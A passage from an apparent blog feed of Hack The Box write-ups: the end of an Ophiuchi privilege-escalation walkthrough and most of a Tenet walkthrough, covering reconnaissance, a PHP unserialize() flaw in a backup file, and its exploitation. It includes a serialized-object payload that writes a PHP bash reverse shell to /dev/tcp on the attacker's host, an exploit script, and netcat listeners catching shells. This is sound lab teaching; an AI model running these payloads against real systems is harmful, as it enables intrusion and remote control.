-</code></pre></div><p>Finally, I will setup a netcat listener and run the allowed sudo command on the <code>/tmp/</code> directory.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">admin@ophiuchi:/tmp$ sudo /usr/bin/go run /opt/wasm-functions/index.go
-</code></pre></div><p>Now I have a root shell on my listener.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
-$ nc -nvlp <span class="m">53</span>
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
-connect to <span class="o">[</span>10.10.14.23<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.227<span class="o">]</span> <span class="m">45382</span>
-root@ophiuchi:/tmp# id
-id
-<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-root@ophiuchi:/tmp# 
-</code></pre></div><p><div class="img-container"><img src="imgs/image-20210729230638797.png" alt="image-20210729230638797"  /></div>
-</p>
-<hr>
-<h2 id="references">Reference(s)</h2>
-<ul>
-<li>
-<p><a href="https://www.baeldung.com/java-snake-yaml">https://www.baeldung.com/java-snake-yaml</a></p>
-</li>
-<li>
-<p><a href="https://www.fatalerrors.org/a/analysis-of-the-snakeyaml-deserialization-in-java-security.html">https://www.fatalerrors.org/a/analysis-of-the-snakeyaml-deserialization-in-java-security.html</a></p>
-</li>
-<li>
-<p><a href="https://webassembly.github.io/wabt/">https://webassembly.github.io/wabt/</a></p>
-</li>
-</ul>
-]]></content:encoded>
-    </item>
-    
-    <item>
       <title>HackTheBox - Tenet</title>
       <link>https://fahmifj.github.io/hackthebox/tenet/</link>
       <pubDate>Mon, 14 Jun 2021 21:46:38 +0700</pubDate>
       
       <guid>https://fahmifj.github.io/hackthebox/tenet/</guid>
-      <description>Friendly PHP insecure deserialization attack and race condition</description>
-      <content:encoded><![CDATA[<p>Tenet from Hack The Box hosts a Website that is vulnerable to PHP deserialization, and this can be exploited for initial access. Enumerating inside the system reveals a set of database credentials, and these are reused for SSH login. There is a sudo privileges on a custom script, and it can be used to escalate myself into root account if I win a race condition against it.</p>
-<h4 id="skills-learned">Skills Learned</h4>
-<ul>
-<li>PHP deserialization attack</li>
-<li>Race-condition</li>
-</ul>
-<h4 id="tools">Tools</h4>
-<ul>
-<li>Nmap</li>
-<li>Gobuster</li>
-<li>PHP</li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p>A full TCP scan on Tenet discovers two open ports: SSH on port 22 and an Apache web server on port 80.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ <span class="nv">ports</span><span class="o">=</span><span class="k">$(</span>nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> -T4 10.10.10.223 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f <span class="m">1</span> <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed s/,$//<span class="k">)</span>
-</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
-$ nmap -sC -sV -p<span class="nv">$ports</span> -oA scans/full-tenet 10.10.10.223
-<span class="c1"># Nmap 7.80 scan initiated Tue Mar 16 23:32:46 2021 as: nmap -sC -sV -p22,80 -oA scans/full-tenet 10.10.10.223</span>
-Nmap scan report <span class="k">for</span> 10.10.10.223
-Host is up <span class="o">(</span>0.059s latency<span class="o">)</span>.
-Scanned at 2021-03-16 23:32:46 EDT <span class="k">for</span> 17s
-
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-<span class="p">|</span> ssh-hostkey: 
-<span class="p">|</span>   <span class="m">2048</span> cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 <span class="o">(</span>RSA<span class="o">)</span>
-<span class="p">|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA4SymrtoAxhSnm6gIUPFcp1VhjoVue64X4LIvoYolM5BQPblUj2aezdd9aRI227jVzfkOD4Kg3OW2yT5uxFljn7q/Mh5/muGvUNA+nNO6pCC0tZPoPEwMT+QvR3XyQXxbP6povh4GISBySLw/DFQoG3A2t80Giyq5Q7P+1LH1f/m63DyiNXOPS8fNBPz59BDEgC9jJ5Lu2DTu8ko1xE/85MLYyBKRSFHEkqagRXIYUwVQASHgo3OoJ+VAcBTJZH1TmXDc4c6W0hIPpQW5dyvj3tdjKjlIkw6dH2at9NL3gnTP5xnsoiOu0dyofm2L5fvBpzvOzUnQ2rps2wANTZwZ
-<span class="p">|</span>   <span class="m">256</span> 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 <span class="o">(</span>ECDSA<span class="o">)</span>
-<span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLMM1BQpjspHo9teJwTFZntx+nxj8D51/Nu0nI3atUpyPg/bXlNYi26boH8zYTrC6fWepgaG2GZigAqxN4yuwgo<span class="o">=</span>
-<span class="p">|</span>   <span class="m">256</span> e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 <span class="o">(</span>ED25519<span class="o">)</span>
-<span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMQeNqzXOE6aVR3ulHIyB8EGf1ZaUSCNuou5+cgmNXvt
-80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
-<span class="p">|</span> http-methods: 
-<span class="p">|</span>_  Supported Methods: OPTIONS
-<span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
-<span class="p">|</span>_http-title: Apache2 Ubuntu Default Page: It works
-Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-
-Read data files from: /usr/bin/../share/nmap
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-<span class="c1"># Nmap done at Tue Mar 16 23:33:03 2021 -- 1 IP address (1 host up) scanned in 16.80 seconds</span>
-</code></pre></div><h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-80---website">TCP 80 - Website</h3>
-<p><code>nmap</code> already identified that this site is the default page of Apache web server.</p>
-<p><div class="img-container"><img src="imgs/image-20210614165913959.png" alt="image-20210614165913959"  /></div>
-</p>
-<h4 id="gobuster">Gobuster</h4>
-<p>Running <code>gobuster</code> against the site reveals that there is a WordPress site.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
-$ gobuster dir -u http://10.10.10.223/ -w /opt/SecLists/Discovery/Web-Content/common.txt -b 404,403 -x txt,php,bak -o gobuster/gobuster-nohostname
-<span class="o">===============================================================</span>
-Gobuster v3.1.0
-by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
-<span class="o">===============================================================</span>
-<span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.223/
-<span class="o">[</span>+<span class="o">]</span> Method:                  GET
-<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
-<span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
-<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   403,404
-<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
-<span class="o">[</span>+<span class="o">]</span> Extensions:              txt,php,bak
-<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
-<span class="o">===============================================================</span>
-2021/06/14 06:08:53 Starting gobuster in directory enumeration <span class="nv">mode</span>
-<span class="o">===============================================================</span>
-/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 10918<span class="o">]</span>
-/users.txt            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 7<span class="o">]</span>    
-/wordpress            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.10.223/wordpress/<span class="o">]</span>
-                                                                                    
-<span class="o">===============================================================</span>
-2021/06/14 06:11:20 <span class="nv">Finished</span>
-<span class="o">===============================================================</span>
-</code></pre></div><p>Poking <code>/users.txt</code> returns a &ldquo;Success&rdquo; message.</p>
-<p><div class="img-container"><img src="imgs/image-20210614171354046.png" alt="image-20210614171354046"  /></div>
-</p>
-<h4 id="wordpress">/wordpress</h4>
-<p>On  <code>/wordpress</code>, somehow  the site looks broken.</p>
-<p><div class="img-container"><img src="imgs/image-20210614171926106.png" alt="image-20210614171926106"  /></div>
-</p>
-<p>It turns out there is a hostname.</p>
-<p><div class="img-container"><img src="imgs/image-20210614172030551.png" alt="image-20210614172030551"  /></div>
-</p>
-<p>I&rsquo;ll add <code>tenet.htb</code> to my <code>/etc/hosts</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
-$ <span class="nb">echo</span> <span class="s1">&#39;tenet.htb 10.10.10.223&#39;</span> &gt;&gt; /etc/hosts
-</code></pre></div><p>Poking the site with <code>curl</code> shows that this port has a slightly different contents when it visited using a hostname.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
-$ curl -s http://10.10.10.223 <span class="p">|</span> wc -c
-<span class="m">10918</span>
-→ root@kali «tenet» «10.10.14.31» 
-$ curl -s http://tenet.htb <span class="p">|</span> wc -c 
-<span class="m">10581</span>
-</code></pre></div><h3 id="tcp-80---tenethtb">TCP 80 - tenet.htb</h3>
-<p>On <code>tenet.htb</code>, there are some blog posts.</p>
-<p><div class="img-container"><img src="imgs/image-20210614173225299.png" alt="image-20210614173225299"  /></div>
-</p>
-<p>One of the post titled with &ldquo;Migrations&rdquo; states that they&rsquo;re currently migrating the data from a flat file.</p>
-<blockquote>
-<p>/etc/passwd and /etc/shadow are the examples of what is known as a flat file structure.</p>
-</blockquote>
-<p><div class="img-container"><img src="imgs/image-20210614173704577.png" alt="image-20210614173704577"  /></div>
-</p>
-<p>At the bottom, there is a comment by a user named <code>neil</code>.</p>
-<p><div class="img-container"><img src="imgs/image-20210614174052879.png" alt="image-20210614174052879"  /></div>
-</p>
-<p>The user was asking about a PHP file called sator and its backup file. I&rsquo;ll note this.</p>
-<h4 id="wpscan">WPScan</h4>
-<p>I ran a <code>wpscan</code>  to find some database backup or something related with that, but I didn&rsquo;t find anything except usernames.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
-$ wpscan --url http://tenet.htb/ -e vp,vt,cb,dbe,u1-15                                                          
-_______________________________________________________________
-         __          _______   _____
-         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____<span class="p">|</span>
-          <span class="se">\ \ </span> /<span class="se">\ </span> / /<span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>___   ___  __ _ _ __ ®
-           <span class="se">\ \/</span>  <span class="se">\/</span> / <span class="p">|</span>  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __<span class="p">|</span>/ _<span class="sb">`</span> <span class="p">|</span> <span class="err">&#39;</span>_ <span class="se">\
-</span><span class="se"></span>            <span class="se">\ </span> /<span class="se">\ </span> /  <span class="p">|</span> <span class="p">|</span>     ____<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>
-             <span class="se">\/</span>  <span class="se">\/</span>   <span class="p">|</span>_<span class="p">|</span>    <span class="p">|</span>_____/ <span class="se">\_</span>__<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>
-
-         WordPress Security Scanner by the WPScan Team
-                         Version 3.8.17
-       Sponsored by Automattic - https://automattic.com/
-       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
-_______________________________________________________________
-...&lt;SNIP&gt;...
-<span class="o">[</span>i<span class="o">]</span> User<span class="o">(</span>s<span class="o">)</span> Identified:
-
-<span class="o">[</span>+<span class="o">]</span> protagonist
- <span class="p">|</span> Found By: Author Posts - Author Pattern <span class="o">(</span>Passive Detection<span class="o">)</span>
- <span class="p">|</span> Confirmed By:
- <span class="p">|</span>  Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
- <span class="p">|</span>  Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
- <span class="p">|</span>   - http://tenet.htb/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100<span class="p">&amp;</span><span class="nv">page</span><span class="o">=</span><span class="m">1</span>
- <span class="p">|</span>  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
- <span class="p">|</span>  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
-
-<span class="o">[</span>+<span class="o">]</span> neil
- <span class="p">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
- <span class="p">|</span> Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
-</code></pre></div><h4 id="directory-brute-force-guessing">Directory brute-force (Guessing)</h4>
-<p>I tried to guess the location of sator php files with <code>curl</code> but nothing there.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
-$ <span class="k">for</span> i in sator.php sator.php.bak<span class="p">;</span> <span class="k">do</span> curl -sIL http://tenet.htb/<span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
-HTTP/1.1 <span class="m">404</span> Not Found
-Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 10:51:50 GMT
-Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
-Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1
-
-HTTP/1.1 <span class="m">404</span> Not Found
-Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 10:51:51 GMT
-Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
-Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1
-</code></pre></div><h3 id="vhost-enumeration">Vhost Enumeration</h3>
-<p>Next, I&rsquo;ll try to enumerate vhost, but first I&rsquo;ll use <code>cewl</code> to generate a custom wordlist. Because &ldquo;sator&rdquo; and &ldquo;backup&rdquo; are consists of 5 characters, I&rsquo;ll set the minimum word length to 5.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
-$ cewl -m <span class="m">5</span> -w wordlist-vhost http://tenet.htb
-CeWL 5.4.6 <span class="o">(</span>Exclusion<span class="o">)</span> Robin Wood <span class="o">(</span>robin@digi.ninja<span class="o">)</span> <span class="o">(</span>https://digi.ninja/<span class="o">)</span>
-</code></pre></div><p>I tried the wordlist with <code>ffuf</code>, but didn&rsquo;t find any (damn this tool is insanely fast, took 5 sec).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
-$ ffuf -w wordlist-vhost -u http://10.10.10.223 -H <span class="s2">&#34;Host: FUZZ.tenet.htb&#34;</span> -mc <span class="m">200</span> -fl <span class="m">376</span>
-
-        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
-       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
-       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
-        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
-         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
-          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       
-
-       v1.3.0-dev
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://10.10.10.223
- :: Wordlist         : FUZZ: wordlist-vhost
- :: Header           : Host: FUZZ.tenet.htb
- :: Follow redirects : <span class="nb">false</span>
- :: Calibration      : <span class="nb">false</span>
- :: Timeout          : <span class="m">10</span>
- :: Threads          : <span class="m">40</span>
- :: Matcher          : Response status: <span class="m">200</span>
- :: Filter           : Response lines: <span class="m">376</span>
-________________________________________________
-
-:: Progress: <span class="o">[</span>93/93<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">11</span> req/sec :: Duration: <span class="o">[</span>0:00:05<span class="o">]</span> :: Errors: <span class="m">0</span> ::
-</code></pre></div><h3 id="apache-default-page-revisit">Apache Default Page (Revisit)</h3>
-<p>The files that user Neil talking about was found at  <code>http://10.10.10.223/[here]</code> .</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
-$ <span class="k">for</span> i in sator.php sator.php.bak<span class="p">;</span> <span class="k">do</span> curl -sIL http://10.10.10.223/<span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
-HTTP/1.1 <span class="m">200</span> OK
-Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 11:21:04 GMT
-Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
-Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
-
-HTTP/1.1 <span class="m">200</span> OK
-Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 11:21:05 GMT
-Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
-Last-Modified: Thu, <span class="m">17</span> Dec <span class="m">2020</span> 09:52:50 GMT
-ETag: <span class="s2">&#34;202-5b6a5f47911e4&#34;</span>
-Accept-Ranges: bytes
-Content-Length: <span class="m">514</span>
-Content-Type: application/x-trash
-</code></pre></div><p>Another guessing, here the keyword is &ldquo;Migration&rdquo;, so I think that before they moving into <code>/wordpress/</code>, the site was previously hosted at  <code>/</code> (the root).</p>
-<p>Poking <code>Sator.php</code> results the following contents:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
-$ curl -s http://10.10.10.223/sator.php
-<span class="o">[</span>+<span class="o">]</span> Grabbing users from text file &lt;br&gt;
-<span class="o">[]</span> Database updated &lt;br&gt;
-</code></pre></div><p>Poking <code>sator.php.bak</code> returns PHP codes.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
-$ curl -s http://10.10.10.223/sator.php.bak
-&lt;?php
-
-class DatabaseExport
-<span class="o">{</span>
-        public <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">&#39;users.txt&#39;</span><span class="p">;</span>
-        public <span class="nv">$data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-
-        public <span class="k">function</span> update_db<span class="o">()</span>
-        <span class="o">{</span>
-                <span class="nb">echo</span> <span class="s1">&#39;[+] Grabbing users from text file &lt;br&gt;&#39;</span><span class="p">;</span>
-                <span class="nv">$this</span>-&gt; <span class="nv">data</span> <span class="o">=</span> <span class="s1">&#39;Success&#39;</span><span class="p">;</span>
-        <span class="o">}</span>
-
-
-        public <span class="k">function</span> __destruct<span class="o">()</span>
-        <span class="o">{</span>
-                file_put_contents<span class="o">(</span>__DIR__ . <span class="s1">&#39;/&#39;</span> . <span class="nv">$this</span> -&gt;user_file, <span class="nv">$this</span>-&gt;data<span class="o">)</span><span class="p">;</span>
-                <span class="nb">echo</span> <span class="s1">&#39;[] Database updated &lt;br&gt;&#39;</span><span class="p">;</span>
-        //      <span class="nb">echo</span> <span class="s1">&#39;Gotta get this working properly...&#39;</span><span class="p">;</span>
-        <span class="o">}</span>
-<span class="o">}</span>
-
-<span class="nv">$input</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;arepo&#39;</span><span class="o">]</span> ?? <span class="s1">&#39;&#39;</span><span class="p">;</span>
-<span class="nv">$databaseupdate</span> <span class="o">=</span> unserialize<span class="o">(</span><span class="nv">$input</span><span class="o">)</span><span class="p">;</span>
-
-<span class="nv">$app</span> <span class="o">=</span> new DatabaseExport<span class="p">;</span>
-<span class="nv">$app</span> -&gt; update_db<span class="o">()</span><span class="p">;</span>
-
-
-?&gt;
-</code></pre></div><h3 id="source-code-analysis">Source Code Analysis</h3>
-<h4 id="deserialization-vulnerability">Deserialization vulnerability</h4>
-<p>From the previous code, <code>sator.php.bak</code> contains a PHP magic function called <code>__destruct()</code>. I&rsquo;m not skilled enough to explain it on detail, but from what I know is that the function will be called when there is no more references to an object (comment by me):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$app</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">;</span>
-<span class="nv">$app</span> <span class="o">-&gt;</span> <span class="na">update_db</span><span class="p">();</span> 
-<span class="c1">// __destruct is called afterwards
-</span><span class="c1">// [] Database updated will be printed out
-</span></code></pre></div><p>Here is an example:</p>
-<p><div class="img-container"><img src="imgs/image-20210614190334075.png" alt="image-20210614190334075"  /></div>
-</p>
-<p>Furthermore, the user-controlled input with parameter <code>arepo</code> is directly passed to <code>unserialize()</code> function. Knowing this, I could send a malicious DatabaseExport object (serialized) by assuming that <code>sator.php</code> uses the same code as <code>sator.php.bak</code>.</p>
-<h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-www-data">Shell as www-data</h3>
-<h4 id="insecure-deserialization-attack---poc">Insecure Deserialization attack - PoC</h4>
-<p>From the previous code, <code>unserialize</code> is called before the creation of object (<code>$app</code>), so I will use the opposite magic function called <code>__construct()</code>.</p>
-<p>I&rsquo;ll do some testing with this script below.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">class</span> <span class="nc">DatabaseExport</span>
-<span class="p">{</span>
-        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
-        <span class="p">{</span>
-        		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user_file</span> <span class="o">=</span> <span class="s1">&#39;test.php&#39;</span><span class="p">;</span>
-                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span><span class="p">;</span>
-        <span class="p">}</span>
-<span class="p">}</span>
-<span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">();</span>
-<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></div><p>I use URL encode there because I&rsquo;m going to use <code>curl</code> to interact with the site. I will save the script to a file called <code>tenetization.php</code>.</p>
-<p>I will run that script and copy the output. If I don&rsquo;t have PHP, I could use <a href="https://www.w3schools.com/php/phptryit.asp?filename=tryphp_compiler">this site</a> to get output of my PHP script.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
-$ php tenetization.php
-O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A8%3A%22test.php%22%3Bs%3A4%3A%22data%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D
-</code></pre></div><p>I&rsquo;ll send that output to <code>sator.php</code> via <code>curl</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
-$ curl -sI <span class="s2">&#34;http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A8%3A%22test.php%22%3Bs%3A4%3A%22data%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D&#34;</span>
-HTTP/1.1 <span class="m">200</span> OK
-Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 12:43:43 GMT
-Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
-Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
-</code></pre></div><p>When I visit <code>10.10.10.223/test.php</code>, it returns the PHP info page, which means I have a code execution.</p>
-<p><div class="img-container"><img src="imgs/image-20210614194451145.png" alt="image-20210614194451145"  /></div>
-</p>
-<p>Based on 0xdf&rsquo;s awesome <a href="https://0xdf.gitlab.io/2021/06/12/htb-tenet.html#create-serialized-object">writeup</a>,  this payload would also works:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">class</span> <span class="nc">DatabaseExport</span>
-<span class="p">{</span>
-		<span class="k">public</span> <span class="nx">user_file</span> <span class="o">=</span> <span class="s1">&#39;test.php&#39;</span><span class="p">;</span>
-		<span class="k">public</span> <span class="nx">data</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">();</span>
-<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></div><h4 id="insecure-deserialization-attack---weaponize">Insecure Deserialization attack - Weaponize</h4>
-<p>This time, I&rsquo;ll modify the file name and the data for reverse shell.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">class</span> <span class="nc">DatabaseExport</span>
-<span class="p">{</span>
-        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
-        <span class="p">{</span>
-        		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user_file</span> <span class="o">=</span> <span class="s1">&#39;iamf.php&#39;</span><span class="p">;</span>
-                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php system(</span><span class="se">\&#34;</span><span class="s2">/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.31/443 0&gt;&amp;1&#39; </span><span class="se">\&#34;</span><span class="s2">) ?&gt;&#34;</span><span class="p">;</span>
-        <span class="p">}</span>
-<span class="p">}</span>
-<span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">();</span>
-<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></div><p>I&rsquo;ll script the exploitation step and then wait on my listener</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
-</span><span class="cp"></span>
-<span class="nv">serial</span><span class="o">=</span><span class="sb">`</span>php tenetization.php<span class="sb">`</span>
-curl -s http://10.10.10.223/sator.php?arepo<span class="o">=</span><span class="nv">$serial</span>
-sleep 5<span class="p">;</span>
-curl -s http://10.10.10.223/iamf.php
-</code></pre></div><p>When I run the exploit, it hangs.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
-$ bash tenetization.sh
-<span class="o">[</span>+<span class="o">]</span> Grabbing users from text file &lt;br&gt;
-<span class="o">[]</span> Database updated &lt;br&gt;<span class="o">[]</span> Database updated &lt;br&gt;
-</code></pre></div><p>But after a few seconds, I have a shell on my listener</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «~» «10.10.14.31»
-$ nc -nvlp <span class="m">443</span>
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
-connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.223<span class="o">]</span> <span class="m">39174</span>
